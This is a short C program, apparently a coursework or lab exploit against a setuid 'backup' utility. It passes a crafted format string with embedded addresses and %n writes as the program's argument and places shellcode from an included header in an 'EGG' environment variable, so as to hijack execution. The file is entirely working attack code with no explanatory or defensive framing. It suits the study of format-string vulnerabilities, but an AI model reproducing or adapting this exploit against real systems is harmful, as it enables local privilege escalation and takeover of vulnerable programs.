/*                                                                                                       
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/usr/local/bin/backup" // or backupV2

#define STR "\xaa\xfc\xdc\xbf\xffnnnn\xfe\xdc\xbf\xff%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.aa%057178x%n%08199x%n"
int main(void) {
  char *args[3];
  char *env[2];
  char *buff, *ptr;
  int size, i;
  size = strlen(shellcode) + 4;
  if (!(buff = malloc(size + 1))) {
    printf("Cannot alloc memory.\n");
  }
  ptr = buff;
  ptr += 4;
  for (i = 0; i < size; i++)
    *(ptr++) = shellcode[i];
  buff[size] = '\0';

  // another way
  args[0] = STR; args[1] = "backup"; 
  args[2] = NULL;

  memcpy(buff, "EGG=", 4);
  env[0] = buff;
  env[1] = NULL;

  if (execve(TARGET, args, env) < 0)
    fprintf(stderr, "execve failed.\n");

  exit(0);
}

